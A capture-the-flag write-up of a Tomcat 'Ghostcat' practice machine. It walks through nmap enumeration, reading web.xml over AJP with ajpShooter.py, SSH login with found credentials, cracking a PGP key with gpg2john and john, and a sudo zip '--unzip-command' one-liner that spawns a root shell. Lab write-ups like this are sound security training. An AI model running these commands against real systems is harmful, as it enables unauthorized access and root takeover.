CTF Machine Writeup: Tomcat / Ghostcat
1. Enumeration
First, we ran an nmap scan against the target machine. The scan results revealed 4 open ports:

Port 22: SSH (OpenSSH 7.2p2)

Port 53: tcpwrapped

Port 8009: ajp13 (Apache Jserv Protocol v1.3)

Port 8080: http (Apache Tomcat 9.0.30)

2. Exploitation (Ghostcat Vulnerability)
Since the AJP service was running on port 8009, we exploited the Ghostcat vulnerability using the ajpShooter.py script. This allowed us to successfully read the /WEB-INF/web.xml file:

Bash
python3 ajpShooter.py http://tom 8009 /WEB-INF/web.xml read
Upon reviewing the source code of the file, we discovered a password for the user skyfuck.

Credentials Found: skyfuck:[REDACTED]

3. Initial Access & User Flag
Using the discovered credentials, we logged into the system via SSH as the user skyfuck. We then navigated to the /home/merlin directory and retrieved the User Flag.

Bash
sshpass -p '[REDACTED]' ssh skyfuck@tom
cat /home/merlin/user.txt
# Output: THM{[REDACTED]}
4. Lateral Movement
In the skyfuck user's home directory, we found two notable files: credential.pgp and tryhackme.asc.

We extracted the hash from tryhackme.asc using the gpg2john tool on our local machine (Kali) and successfully cracked it using john with the rockyou.txt wordlist.

Bash
gpg2john tryhackme.asc > PgpHash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt PgpHash.txt
Cracked PGP Passphrase: [REDACTED]

We then used this passphrase to decrypt the credential.pgp file on the target system, which revealed the credentials for the user merlin.

Merlin Credentials: merlin:[REDACTED]

5. Privilege Escalation (Root)
We logged in again via SSH as the user merlin and ran the sudo -l command to check which commands could be executed with root privileges.

Bash
sshpass -p '[REDACTED]' ssh merlin@tom
sudo -l
The output showed that the user merlin could run /usr/bin/zip using sudo without a password. We leveraged an argument execution feature of the zip command to spawn a Root shell:

Bash
touch a
sudo zip 1.zip a -T --unzip-command="sh -c /bin/bash"
After successfully gaining root access, we navigated to the /root directory and captured the Root Flag.

Bash
cat /root/root.txt
# Output: THM{[REDACTED]}
